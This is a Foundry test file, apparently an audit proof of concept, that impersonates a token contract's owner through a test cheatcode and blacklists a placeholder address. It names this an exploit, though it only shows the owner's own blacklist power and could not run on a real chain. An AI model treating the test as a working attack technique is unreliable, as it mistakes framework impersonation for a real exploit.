// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICoinToken {
    function owner() external view returns (address);
    function enableBlacklist(address account) external;
    function isBlacklisted(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF9881a0Bf01b1ec048506A188B06d48808087657;
    address attacker = address(this);
    ICoinToken token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ICoinToken(TARGET);
        vm.label(TARGET, "glra Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the contract owner
        address owner = token.owner();
        vm.label(owner, "Contract Owner");

        // Define victim address (use a test address)
        address victim = address(0xdeadbeef);
        vm.label(victim, "Victim");

        // Verify victim is not already blacklisted
        require(!token.isBlacklisted(victim), "Victim already blacklisted");

        // Impersonate the owner and blacklist the victim
        vm.startPrank(owner);
        token.enableBlacklist(victim);
        vm.stopPrank();

        // Verify the exploit succeeded - victim is now blacklisted
        assertEq(token.isBlacklisted(victim), true, "Victim should be blacklisted");
        assertEq(token.isBlacklisted(victim), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
